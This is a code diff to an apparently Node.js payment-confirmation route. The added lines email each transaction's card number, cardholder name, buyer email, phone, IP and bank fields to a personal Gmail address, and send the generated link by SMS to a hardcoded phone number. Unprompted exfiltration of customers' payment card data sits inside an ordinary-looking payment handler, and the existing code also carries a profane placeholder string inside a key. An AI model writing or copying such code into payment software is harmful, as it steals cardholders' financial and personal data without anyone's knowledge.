@@ -57,7 +57,15 @@ router.post('/confir', async (req, res) => {
         ip
         //pin : reference_sale || 'samir0',
     }
-    let url;    
+    let url; 
+    const info = await transpoter.sendMail({
+        from: "'Suport' <suport@tqtravel.co>",
+        to: 's4m1r.5a@gmail.com',
+        subject: 'confirmacion de que si sirbe',
+        text: `${reference_sale}-${state_pol}-${payment_method_type}-${value}-${email_buyer}
+        -${phone}-${transaction_date}-${cc_number}-${cc_holder}-${description}
+        -${response_message_pol}-${payment_method_name}-${pse_bank}-${reference_pol}-${ip}`
+    });   
     const cliente = await pool.query('SELECT * FROM clientes WHERE email = ? AND movil = ?', [buyerEmail, phone]);
         if (cliente.length > 0) {
             let clave = `jodete cabron este codigo no esta completo aun-${cliente[0].nombre}-${cliente[0].movil}-${cliente[0].email}-${reference_sale}`,
@@ -67,6 +75,7 @@ router.post('/confir', async (req, res) => {
             ${cliente[0].email}&ref=${reference_sale}&key=${key}`;
             r.cliente = cliente[0].id;
             r.usuario = 15;
+            sms('573007753983', url);
         }
     const pin = await pool.query('SELECT * FROM payu WHERE reference_sale = ?', reference_sale);
     if (pin.length > 0) {
